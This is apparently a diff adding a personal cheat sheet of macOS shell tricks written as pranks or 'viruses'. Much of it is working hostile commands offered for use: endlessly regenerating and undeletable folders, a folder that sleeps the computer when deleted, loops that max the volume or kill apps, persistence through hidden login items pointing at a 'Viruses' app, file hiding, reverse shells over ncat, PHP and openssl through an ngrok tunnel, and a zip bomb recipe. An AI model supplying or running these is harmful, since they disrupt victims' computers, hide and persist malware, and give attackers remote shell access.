@@ -1,0 +1,94 @@
+To get path to something, drag the thing into the terminal.
+screen makes it so when you close the terminal (command-q), it will not stop the program.
+
+
+Hydra Folder:
+
+cd ~/Desktop; while :; do for i in ${folders[@]}; do if [ ! -d $i ]; then mkdir $i; mkdir hydra$num; folders+=(hydra$num); ((num++)); fi; done; sleep 0.1; done
+
+Non deletable folder:
+
+cd Desktop; while :; do mkdir ~/Desktop/hi; sleep 0.1; done
+
+
+Folder that turn your computer off when deleted:
+
+cd ~/Desktop; while :; do if [ ! -d hi ]; then mkdir hi; pmset sleepnow; fi; sleep 0.1; done
+
+
+Turn volume max:
+
+while :; do osascript -e 'tell application "Finder" to set volume 10'; sleep 0.1; done
+
+Say something over and over again:
+
+while :; do say hello; sleep 0.1; done
+
+
+Make app not able to open:
+
+while :; do pkill path to application; sleep 0.1; done
+
+Quite app periodically:
+
+while :; do sleep `expr $RANDOM / 10`; pkill path to application; done
+
+Open an file on boot:
+
+osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/'$(whoami)'/directory/to/file.app", hidden:true}'
+
+osascript -e 'tell application "System Events" to make login item at end with properties {name: "Hydra", path:"/Users/'$(whoami)'/Desktop/Coding/Viruses/Hydra Folder Virus.app", hidden:true}'
+
+defaults write loginwindow AutoLaunchedApplicationDictionary -array-add "{ \"Path\" = \"/Users/$USER/Desktop/Coding/Viruses/Hydra Folder Virus.app\"; \"Hide\" = 0; }"
+
+Hide and unhide a file or directory with:
+
+chflags hidden yes.app
+chflags nohidden yes.app
+
+Reverse shell:
+
+good site for this stuff:
+https://www.revshells.com/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+simple:
+
+ncat -l
+ncat localhost port -e /bin/bash
+ngrok tcp 31337 -region au
+
+more complex/stable:
+
+php -r '$sock=fsockopen("host",port);shell_exec("zsh <&3 >&3 2>&3");'
+
+complex & stable:
+
+ncat --ssl -vv -l -p 1234
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 0.tcp.au.ngrok.io:11689 > /tmp/s; rm /tmp/s
+./ngrok tcp 1234 -region au
+
+Quit app:
+pkill "app name"
+
+zip bomb:
+
+dd if=/dev/zero bs=1024 count=10000 | zip zipbomb.zip -
+
+count is the number of KB
+example above creates a 10MiB zip bomb ^
+bs=1024 count = 1000000 = 1.02GB
+
+No password ssh:
+
+create public key:
+cd ~/.ssh
+ssh-keygen
+cat id_rsa.pub
+
+add public key:
+
+mkdir -p ~/.ssh
+touch ~/.ssh/authorized_keys
+cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
